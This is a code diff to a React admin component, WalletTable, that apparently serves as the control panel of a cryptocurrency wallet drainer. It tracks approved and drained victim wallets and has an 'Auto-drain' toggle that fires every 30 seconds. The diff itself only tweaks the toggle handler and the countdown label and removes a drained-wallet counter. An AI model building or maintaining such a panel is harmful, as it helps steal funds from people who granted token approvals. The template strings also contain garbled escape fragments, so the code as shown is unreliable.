@@ -279,7 +279,6 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
 
   const approvedCount = wallets.filter((w) => w.is_approved).length;
   const revokedCount = wallets.filter((w) => !w.is_approved).length;
-  const drainedCount = wallets.filter((w) => w.drained).length;
 
   const filteredWallets = wallets.filter((w) => {
     if (filter === "approved") return w.is_approved;
@@ -362,13 +361,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
           </button>
 
           <button
-            onClick={() => {
-              setAutoDrainOn((v) => {
-                const next = !v;
-                toast.info(next ? "Auto-drain enabled (30s)." : "Auto-drain paused.");
-                return next;
-              });
-            }}
+            onClick={() => setAutoDrainOn((v) => !v)}
             className={cn(
               "flex items-center gap-2 px-4 py-2 rounded-lg border text-sm font-medium transition-colors",
               autoDrainOn
@@ -377,7 +370,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
             )}
           >
             <Zap className="h-4 w-4" />
-            {autoDrainOn ? `Auto-drain ON (\( {countdown !== null ? ` \){countdown}s` : "..."})` : "Auto-drain OFF"}
+            {autoDrainOn ? `Auto-drain ON \( {countdown !== null ? `( \){countdown}s)` : ""}` : "Auto-drain OFF"}
           </button>
         </div>
 
